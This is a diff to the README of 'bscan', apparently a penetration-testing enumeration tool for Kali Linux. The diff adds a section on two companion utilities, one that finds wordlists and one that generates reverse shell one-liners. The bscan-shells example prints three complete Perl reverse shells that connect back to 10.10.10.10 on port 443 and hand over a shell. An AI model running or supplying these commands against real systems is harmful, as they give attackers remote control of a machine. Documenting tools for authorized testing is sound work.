@@ -141,20 +141,33 @@ optional arguments:
   --web-word-list F     the wordlist to use for scans
 ```
 
-Here's what you should see when running `bscan-wordlists --help`:
-```
-usage: bscan-wordlists [OPTIONS]
 
-bscan companion utility for listing and finding
-wordlists on Kali Linux
+## Companion Tools
 
-optional arguments:
-  -h, --help   show this help message and exit
-  --list       list all findable wordlists on the system
-  --find FIND  find the absolute path to a wordlist via a Unix filename
-               pattern
-  --version    program version
+The main `bscan` program ships with two utility programs (`bscan-wordlists` and `bscan-shells`) to make your life a little easier when looking for wordlists and trying to open reverse shells.
+
+`bscan-wordlists` is a program designed for finding wordlist files on Kali Linux. It searches a few default directories and allows for glob filename matching. Here's a simple example:
+```sh
+$ bscan-wordlists --find "*win*"
+/usr/share/wordlists/wfuzz/vulns/dirTraversal-win.txt
+/usr/share/wordlists/metasploit/sensitive_files_win.txt
+/usr/share/seclists/Passwords/common-passwords-win.txt
 ```
+Try `bscan-wordlists --help` to explore other options.
+
+`bscan-shells` is a program that will generate a variety of reverse shell one-liners with `target` and `port` fields populated for you. Here's a simple example to list all Perl-based shells, configured to connect back to `10.10.10.10` on port `443`:
+```sh
+$ bscan-shells --port 443 10.10.10.10 | grep -i -A1 perl
+perl for windows
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.10.10:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+perl with /bin/sh
+perl -e 'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+perl without /bin/sh
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.10.10:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+```
+Note that `bscan-shells` pulls these commands from the [`reverse-shells.toml`](bscan/configuration/reverse-shells.toml) configuration file. Try `bscan-shells --help` to explore other options.
 
 
 ## Development
